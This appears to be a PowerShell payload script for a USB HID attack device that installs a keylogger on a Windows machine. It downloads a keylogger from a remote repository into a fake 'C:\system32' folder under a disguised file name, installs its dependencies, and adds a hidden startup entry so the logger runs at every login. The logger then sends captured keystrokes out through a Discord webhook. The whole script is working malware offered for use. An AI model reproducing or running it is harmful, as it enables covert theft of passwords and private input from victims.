mkdir 'C:\system32\'

cd C:\system32\

iwr -Uri https://raw.githubusercontent.com/simen64/Pico-HID-Scripts/main/discord-keylogger/logger.py -OutFile C:\system32\sys-file.py

py -m pip install discordwebhook pynput

'@echo off', 'start /B pythonw.exe "C:\system32\sys-file.py"' | Set-Content -Path 'C:\system32\startup.bat'

Copy-Item 'C:\system32\startup.bat' "$Env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

Python sys-file.py $dc
